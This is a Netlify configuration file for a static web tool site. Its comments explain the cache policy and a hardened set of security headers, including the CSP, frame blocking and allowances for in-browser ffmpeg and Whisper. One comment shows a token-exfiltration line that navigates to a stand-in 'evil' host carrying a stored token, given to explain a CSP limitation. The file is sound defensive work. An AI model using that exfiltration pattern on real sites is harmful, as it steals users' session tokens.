# B7oothKw — static site, no build step. Netlify just serves the files.
[build]
  publish = "."

# One header block for every path. Two things it does:
#
# 1. Cache: revalidate HTML, CSS and JS on every load. None of the filenames are
#    fingerprinted, so a long cache leaves returning visitors with fresh HTML over a
#    day-old stylesheet — which is exactly what happened when the Turnitin note field
#    rendered as a raw browser textarea for 24 hours after a class was renamed.
#    Revalidating costs a 304 on files measured in single-digit KB.
#
# 2. Security headers, which used to be declared per-page and so were missing on half the
#    site (login, turnitin, codes, chats, narrator, whatsapp, and the extensionless
#    /pricing form used in ads). The important ones:
#      - frame-ancestors 'none' + X-Frame-Options: the site can't be framed, closing the
#        clickjacking attack where an invisible iframe of turnitin.html/pricing.html sits
#        under a decoy button and a single click burns a scan or starts a payment.
#      - script-src WITHOUT 'unsafe-inline': an injected <script> or onclick="" doesn't
#        run at all. This is the header that earns its keep, and it only works because the
#        site has no inline script left — index.html's redirect is js/index-redirect.js,
#        narrator.html's gate call is js/narrator-gate.js, and login.html's theme button is
#        bound by id in js/theme.js. Adding one inline handler anywhere silently breaks
#        that page, so don't; put it in a file.
#      - connect-src: fetch/XHR/WebSocket may only reach our own API. Note what this does
#        NOT do: it cannot stop a script that has already run from exfiltrating the
#        localStorage token, because a plain `location.href = 'https://evil/?t=' + token`
#        is a NAVIGATION, and no shipping browser implements the navigate-to directive.
#        connect-src narrows the blast radius of a compromised third-party host; keeping
#        script out of the page in the first place is what actually protects the token.
#      - object-src/base-uri 'none': no plugins, no <base> hijack.
#      - COOP same-origin-allow-popups: cuts this page's window relationship with anything
#        it opens or is opened by, WITHOUT breaking Google Sign-In, which talks to a popup
#        it opened itself. Plain 'same-origin' would break the login button.
#
# 'unsafe-inline' remains on style-src only: shell.js, humanizer.js and turnitin.js all
# write style="" attributes, and there is no injection value in a style attribute here.
#
# cdn.jsdelivr.net is still in script-src for one module — @huggingface/transformers in
# js/transcribe.js, the Slide Narrator's Whisper runtime. A CDN that serves any npm
# package on request is barely an allowlist entry, so it comes off the day that module is
# self-hosted; jszip already is (vendor/jszip), which is why esm.sh is gone. jsdelivr also
# stays in connect-src for @ffmpeg/core's wasm, which audio.js fetches into a blob URL.
#
# Three more entries exist only for the Slide Narrator, and were missing until the
# 2026-09-04 audit showed the tool had never worked on the live site under this header:
#   - script-src blob:  audio.js fetches @ffmpeg/core into a blob URL and the ffmpeg
#     worker (vendor/ffmpeg/814.ffmpeg.js) then importScripts() that blob. A blob is a
#     script load like any other, and the worker file is served with this very header,
#     so without blob: the worker logs "Loading the script 'blob:...' violates ..." and
#     the narrator dies at "Loading audio engine". This does NOT reopen inline script:
#     a blob: URL can only be minted by script that is already running, and the only
#     way script runs here is from 'self' or the two named hosts. An injected <script>
#     or onclick="" is still refused exactly as before.
#   - script-src 'wasm-unsafe-eval'  ffmpeg-core and onnxruntime-web (Whisper's
#     backend) are WebAssembly, and browsers refuse WebAssembly.instantiate() under a
#     script-src that names neither this nor 'unsafe-eval'. This keyword allows ONLY
#     wasm compilation; eval(), new Function() and string timers stay blocked.
#   - connect-src https://*.hf.co  huggingface.co no longer serves model files itself:
#     every .onnx under onnx-community/whisper-base.en 302s to us.aws.cdn.hf.co (the
#     xet bridge), and CSP checks the redirect target, so with only huggingface.co and
#     the old cdn-lfs.huggingface.co every model fetch was blocked. Both old entries
#     stay for the metadata requests that still come from them.
[[headers]]
  for = "/*"
  [headers.values]
    Cache-Control = "public, max-age=0, must-revalidate"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "no-referrer"
    X-Frame-Options = "DENY"
    # Declared rather than left to Netlify's default, which is max-age only. No preload:
    # that pin is not something a site can walk back.
    Strict-Transport-Security = "max-age=31536000; includeSubDomains"
    Cross-Origin-Opener-Policy = "same-origin-allow-popups"
    Permissions-Policy = "geolocation=(), camera=(), payment=(), usb=()"
    Content-Security-Policy = "default-src 'self'; base-uri 'none'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; script-src 'self' blob: 'wasm-unsafe-eval' https://accounts.google.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.googleusercontent.com; font-src 'self' data:; media-src 'self' blob:; worker-src 'self' blob:; connect-src 'self' blob: https://api.gahumanizer.com https://accounts.google.com https://cdn.jsdelivr.net https://huggingface.co https://cdn-lfs.huggingface.co https://*.hf.co; frame-src https://accounts.google.com; upgrade-insecure-requests"
